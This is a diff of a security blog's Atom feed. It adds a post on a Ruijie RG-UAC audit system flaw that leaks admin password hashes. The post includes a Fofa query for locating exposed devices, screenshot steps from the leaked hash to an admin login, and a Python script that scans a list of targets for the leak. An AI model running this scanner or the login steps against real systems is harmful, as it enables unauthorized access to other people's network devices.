@@ -6,7 +6,7 @@
   <link href="https://www.lintstar.top/atom.xml" rel="self"/>
   
   <link href="https://www.lintstar.top/"/>
-  <updated>2021-03-05T11:30:06.352Z</updated>
+  <updated>2021-03-08T08:42:04.630Z</updated>
   <id>https://www.lintstar.top/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞</title>
+    <link href="https://www.lintstar.top/2021/03/6c05e651.html"/>
+    <id>https://www.lintstar.top/2021/03/6c05e651.html</id>
+    <published>2021-03-08T04:00:58.000Z</published>
+    <updated>2021-03-08T08:42:04.630Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞"><a href="#锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞" class="headerlink" title="锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞"></a>锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞</h2><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><strong>锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台</strong></p><p><strong>编号：CNVD-2021-14536</strong></p><h1 id="Fofa指纹"><a href="#Fofa指纹" class="headerlink" title="Fofa指纹"></a>Fofa指纹</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;&quot;RG-UAC登录页面&quot; &amp;&amp; body&#x3D;&quot;admin&quot;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308161840.png" alt="image-20210308161840038"></p><p><strong>源代码搜索：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308161935.png" alt="image-20210308161935213"></p><p><strong>MD5解密：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308162005.png" alt="image-20210308162005706"></p><p><strong>登录成功</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308162316.png" alt="image-20210308162316216"></p><h1 id="自动化-POC"><a href="#自动化-POC" class="headerlink" title="自动化 POC"></a>自动化 POC</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_1</span>(<span class="params">target_url</span>):</span></span><br><span class="line">    vuln_url = target_url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;super_admin&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 ,F12查看源码获取密码md5值 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Scan</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">&quot;http&quot;</span>:</span><br><span class="line">                url = <span class="string">&quot;http://&quot;</span> + url</span><br><span class="line">            url = url.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;\033[31m[x] 请求报错 \033[0m&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞&quot;&gt;&lt;a href=&quot;#锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞&quot; class=&quot;headerlink&quot; title=&quot;锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞&quot;&gt;</summary>
+      
+    
+    
+    
+    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
+    
+    <category term="Web" scheme="https://www.lintstar.top/categories/Note/Web/"/>
+    
+    
+    <category term="Vulnerability" scheme="https://www.lintstar.top/tags/Vulnerability/"/>
+    
+    <category term="Fofa" scheme="https://www.lintstar.top/tags/Fofa/"/>
+    
+  </entry>
   
   <entry>
     <title>CentOS 8 配置记录</title>
@@ -81,7 +109,7 @@
     <link href="https://www.lintstar.top/2021/01/9072ee96.html"/>
     <id>https://www.lintstar.top/2021/01/9072ee96.html</id>
     <published>2021-01-25T04:00:58.000Z</published>
-    <updated>2021-02-01T05:25:03.361Z</updated>
+    <updated>2021-03-08T08:41:15.703Z</updated>
     
     <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">本文已加密 <br> 论一名合格的 FOFA 工程师的自我修养</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ff0bb1a852855a2af57559e57107dd173bfeb69529c4b6fade8fe22c3e359f21">a8af586a26b9f637745602962664331bad848238cd23ac0ee7f59954861211c4621a4a1eee1033ce40e4306980b7b0d7acb9f6428aadb49de5b199a85e6d6f6065d0b52c15e8b74f096e6600ab0dbd114892fc7088dcecb6f9df2f45bcd41d8d2430e914a873208cd3c898d0fb2317e54e2dfe4ad1346c1de05339fbb5a991a7359539842ad67d815ca806797efaf3e7d00fc457070077bdcf08336d163c22eba8fe33ecbe6d0b26637012612aed2179d4e763e7ec1d6a78fe9535fff55ad4f1da8c6145c3eb75a79ca35626de64d46bf64fb5779943a605c7d00787d38d9fb12415371e019ad447e967d16f415c044dde1e20aef05113c96a2e97e3acae03ba70c7eddf54eb609107887d1db44d1b529d99787c8ea84766224019c3b107185c53059f15177dac2eccbb231c45128f776cbdb2b91709bcb5c4544ec2e6fc1ce48fea11f1dcaffc63d135d61e39ecaee07107784a5e8cc40159686290eb4826b8c595411936f657421120fca124a48bc453659b25424dc86f03455d5bf0c24787cc692f9b0b23c6cab616f67d1a908f22523b0514dc7eff84a6c11207d65cc04e11b833507f3091a0da4587f2ac1bac90359c68219c037428c06c4f88c50b827b846bd7378679cc979f245cafd45ba310a62646fc86ebefde0d93ce2d964c47e4c17802a9d08c1d38d43a4d671a02c0611622e4eadd4ecbb59bae9a2039c9acd399d9759a21533c6f730ac21ca2e526a94d87d88ed367edff9fbe57f749af438c214b6ac81864d4e9597781ad759e9ff97ef084b8b78f38b8f8428a9b044addf6345c422c83a300c63e38726538a5ae8730d101fc6f44fcb708d590746ddbd906ad5a6a59dd5091601c0101a93c363f8b2576b652583a51223796b284201e2ec75244b55de181286e2920978858675510131fa4d3d065875f5a7df4da85e11eab2e382ef34ac4a79d30096dd1d61bfb2b4a7ea7541f64c38d150225a712a4bc16500d305d8e291f352edbf112a17991298463d1f43261cf3e23339eb01afd09df4a70633699dd62ab9195b61af50130c3bfe01db42477c33123e530c98829c871073c06e5aae731175236339a29e0f4f5b469ba79b4d47bb4640cc4d69eae06abaf785a2a123a321fe1a8b6a6b22dd387ad077959b725c1afe93a150b6b2ea930e18f9680fad357934c4af3b2bb3736ea2198fc9bff48019d8f97e17b580860e87061a82fac9a1d6bac2a32abfb87a05f46e5b91dc11c6e643bcb6751f1d65401c2f0302596816114c24f54c7b9074ac3213545327d21cacf2b04fba1f212640b2a2e5dc2dc8a53dd3cd81a8f6dc22b7b883744e89d587bc59daf811309adf89bd86c62c29330d91c62c45dc38b09d17d70c98d938e976fc16b622a8b4f121cffbd6d2752001344d28fa8ad381dae64613197c149ee7b1b92cc32df6f754713d93b4683344434ff8fa2079d3b33012d1f3f37c4abb315772693a3a34ab457c4475fef3c9f02c790bd47656fff2a858c324b9c63b23a1e2b0e7466dfe50fd5b1b9ba28abb53ca4f11a04bd5f721164f9b1ce3112ab9dff42a1ed9dcae3b5d66ffcd71a3c34722629b4213ad6a6dd73e664dc225a044a3fb5993db35c8592891dd2617911b9b32ef2aefc0bbcecb96dcd42a7ed7d1d7026d41bdb96c3f85424b98ab6a8383ad90426c6169603457a7a17140cf9eb61075813e8a4f60991c7b4e9b97367b50efe87b69bdc38a8f23d9aecb0f2fc4a8b901e736310e3047dc56c930a5dbb6834ee401d29f28856104f785b7769d107c67389af96a910f7d962167c6cfeb2f388556d35f2fac5b6c513644851d27e730d2b0d693614219d15d97b7a427820918b9e3e6a6ecaeabf948c721285cc16be87c54b815190909258709c61bd6e0257ba308e86f7b3a739286b9c5b9679b535780e84876fd75f927a07522de9c6edc535dc9b9e72db0b6fc31d3ef9cd63725f11648e2d3c1abe5750f59595e91f2f1b5b73c2d9833f544b72dbb7c1d594e80ef359f5323ebf48b70958ec85660a5bdb591038e5200a3f941f1dab74c7529b9984700ad26c2ee545fa64856870</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
     
@@ -100,6 +128,8 @@
     <category term="Vulnerability" scheme="https://www.lintstar.top/tags/Vulnerability/"/>
     
     <category term="Github" scheme="https://www.lintstar.top/tags/Github/"/>
+    
+    <category term="Fofa" scheme="https://www.lintstar.top/tags/Fofa/"/>
     
   </entry>
   
@@ -446,11 +476,11 @@
     <category term="Blog" scheme="https://www.lintstar.top/categories/Blog/"/>
     
     
+    <category term="Mac" scheme="https://www.lintstar.top/tags/Mac/"/>
+    
     <category term="Hexo" scheme="https://www.lintstar.top/tags/Hexo/"/>
     
     <category term="CDN" scheme="https://www.lintstar.top/tags/CDN/"/>
-    
-    <category term="Mac" scheme="https://www.lintstar.top/tags/Mac/"/>
     
     <category term="Butterfly" scheme="https://www.lintstar.top/tags/Butterfly/"/>
     
